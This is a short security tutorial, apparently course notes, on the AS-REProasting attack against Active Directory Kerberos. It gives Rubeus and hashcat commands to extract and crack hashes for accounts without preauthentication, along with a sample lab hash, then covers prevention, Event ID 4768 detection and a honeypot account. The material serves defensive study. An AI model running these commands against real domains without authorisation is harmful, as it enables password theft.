## Description

The **AS-REProasting** attack is similar to Kerberoasting. Attackers can obtain crackable hashes for user accounts with the **Do not require Kerberos preauthentication** property enabled. The success of this attack relies on cracking the user account password.

## Attack

1. **Extracting Crackable Hashes**: Using tools like Rubeus, hashes can be extracted for each user without Kerberos preauthentication:

    ```powershell
    PS C:\Users\bob\Downloads> .\Rubeus.exe asreproast /outfile:asrep.txt
    ```

    This action saves the hashes for accounts without preauthentication enabled to `asrep.txt`.

2. **Preparing the Hash for Cracking**: Modify the extracted hash by adding `23$` after `$krb5asrep$`:

    ```plaintext
    $krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c6480335...
    ```

3. **Cracking Hash with hashcat**: Use hashcat with mode 18200, specifically for AS-REPRoastable hashes:

    ```bash
    sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
    ```

4. **Viewing the Result**: After cracking, view the result to obtain the cleartext password.

    ```bash
    cat asrepcrack.txt
    ```

## Prevention

This attack's success largely depends on the password strength of accounts with **Kerberos preauthentication** disabled.

- **Review and Limit Usage**: Only use the "no preauthentication" setting if absolutely necessary, and conduct quarterly reviews to ensure accounts don't inadvertently have this property.
- **Strong Password Policy**: Apply a separate policy requiring a minimum of 20 characters for users with this property.

## Detection

When a TGT is requested, Event ID 4768 is generated. While this event is common and heavily logged, correlation to specific IPs or VLANs can help differentiate valid login attempts from potential malicious requests.

## Honeypot

A honeypot user can be effective for detecting AS-REProasting attempts. Create an unused, privileged account with Kerberos preauthentication disabled. Ensure it meets these criteria:

1. **Old Account**: Use an old account with a password that hasn’t changed in years.
2. **Recent Login Activity**: Ensure logins occurred post-password change to avoid suspicion.
3. **Assigned Privileges**: The account should have privileges to be of interest to attackers.

Example honeypot setup:

- **User**: `svc-iam` with specific privileges and preauthentication disabled.

## Caution

Be strategic in setting up honeypots to avoid making the setup too obvious to attackers. Choose the best-suited detection methods for your environment.

---
